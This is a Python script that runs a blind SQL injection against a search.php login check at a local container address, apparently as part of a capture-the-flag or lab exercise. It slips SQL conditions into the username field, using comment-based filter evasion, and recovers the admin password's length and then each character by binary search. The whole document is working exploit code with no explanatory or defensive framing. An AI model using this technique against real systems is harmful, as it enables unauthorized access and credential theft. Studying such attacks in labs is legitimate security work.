import requests
import time

BASE_URL = "http://172.17.0.1:59969/search.php"

def check_condition(condition):
    payload = f'admin"/**/{condition}#'
    r = requests.post(BASE_URL, data={'username': payload}, timeout=10)
    return 'User exists' in r.text

def get_char_at(col, pos):
    """Binary search for character at position pos in column col"""
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        cond = f'&&/**/ascii(mid({col},{pos},1))>{mid}'
        if check_condition(cond):
            low = mid + 1
        else:
            high = mid
    # Confirm
    cond = f'&&/**/ascii(mid({col},{pos},1))={low}'
    if check_condition(cond):
        return chr(low)
    return None

# First, find the password length
print("Finding password length...")
for length in range(1, 100):
    cond = f'&&/**/length(password)={length}'
    if check_condition(cond):
        print(f"Password length: {length}")
        break
else:
    # Try by checking if length > N
    length = 0
    for n in [10, 20, 30, 40, 50, 60, 70, 80]:
        cond = f'&&/**/length(password)>{n}'
        if check_condition(cond):
            length = n
        else:
            break
    print(f"Password length > {length}")
    # Fine-tune
    for n in range(length+1, length+50):
        cond = f'&&/**/length(password)={n}'
        if check_condition(cond):
            print(f"Password length: {n}")
            length = n
            break

print(f"Extracting {length} chars...")
password = ""
for i in range(1, length+1):
    c = get_char_at('password', i)
    if c:
        password += c
        print(f"Char {i}: {c} -> Password so far: {password}")
    else:
        print(f"Failed at char {i}")
        break

print(f"\nFull password: {password}")
EOF

